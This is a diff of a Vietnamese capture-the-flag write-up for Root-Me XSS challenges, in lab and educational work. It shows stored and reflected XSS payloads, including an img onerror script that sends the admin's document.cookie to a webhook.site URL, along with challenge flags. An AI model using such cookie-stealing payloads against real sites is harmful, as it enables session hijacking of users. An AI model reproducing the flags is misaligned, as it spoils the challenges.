@@ -33,9 +33,52 @@ Payload: `ayuq' onmousemove='document.location="https://webhook.site/aa5efb2d-06
 ![image](https://github.com/aQ05/Write-up/assets/121664384/c6f69bd0-f38a-4781-9e82-610e23e907c2)
 
 Thực hiện request với payload. Sau đó, ta thực hiện lại một lần nữa nhưng sẽ thực hiện thêm bước Report đến admin đển POST request:
+
 ![image](https://github.com/aQ05/Write-up/assets/121664384/102832e4-d086-4119-a80b-e2f3e269d2f9)
 
 ![Screenshot 2023-11-11 160952](https://github.com/aQ05/Write-up/assets/121664384/a6a8c118-390f-4652-82db-1a58d76dc8e5)
 
 ## Flag
 `r3fL3ct3D_XsS_fTw`
+# XSS - Stored 1
+So easy to sploit
+
+**Statement:** Steal the administrator session cookie and use it to validate this chall.
+## Cách làm
+Truy cập vào link http://challenge01.root-me.org/web-client/ch18/
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/d4fb4482-d55a-4807-bb40-1083cacdb7e3)
+
+Trước hết ta kiểm tra xem nó bị XSS ở đâu bằng cách nhập `<script>alert(1)</script>` vào từng trường và thấy dữ liệu được lưu lại khi nhập vào ô `message`.
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/6ca93f7e-d63f-4c67-81eb-ac44c5744587)
+
+ Dính lỗi Stored XSS tại ô `message`.
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/9e9bb840-c70d-478f-9429-c705037b2f02)
+
+Payload một đoạn script dẫn đến host của mình kèm theo admin, ở đây chúng ta sử dụng thẻ `img` với thuộc tính `onerror` (nếu đường link dẫn đến ảnh bị lỗi thì nó sẽ tự động thực thi đoạn script bên trong mà không cần thao tác của người dùng).
+
+Payload: `<img src=a onerror='document.location="https://webhook.site/aa5efb2d-0612-4b77-96cc-79606f6bc8aa?"+document.cookie'/>`
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/9524d672-fba8-4de7-a5e6-99cc94b3fe33)
+
+Khi gửi ta sẽ thấy một cái ảnh bị lỗi và tự thực thi câu lệnh
+
+![image](https://github.com/aQ05/Write-up/assets/121664384/45edbd9b-7a5e-4681-9ed1-cfe99b64e3d0)
+
+![Screenshot 2023-11-11 214521](https://github.com/aQ05/Write-up/assets/121664384/80211e65-d540-4dbe-a361-5b9926b0b0f0)
+## Flag
+`NkI9qe4cdLIO2P7MIsWS8ofD6`
+
+# XSS - Stored 2
+Author
+
+**Statement:**
+Steal the administrator session’s cookie and go in the admin section.
+## Cách làm
+Truy cập link http://challenge01.root-me.org/web-client/ch19/
+![image](https://github.com/aQ05/Write-up/assets/121664384/a0fd7f02-239e-4e30-be8d-e9b1b9834dca)
+
+
+## Flag
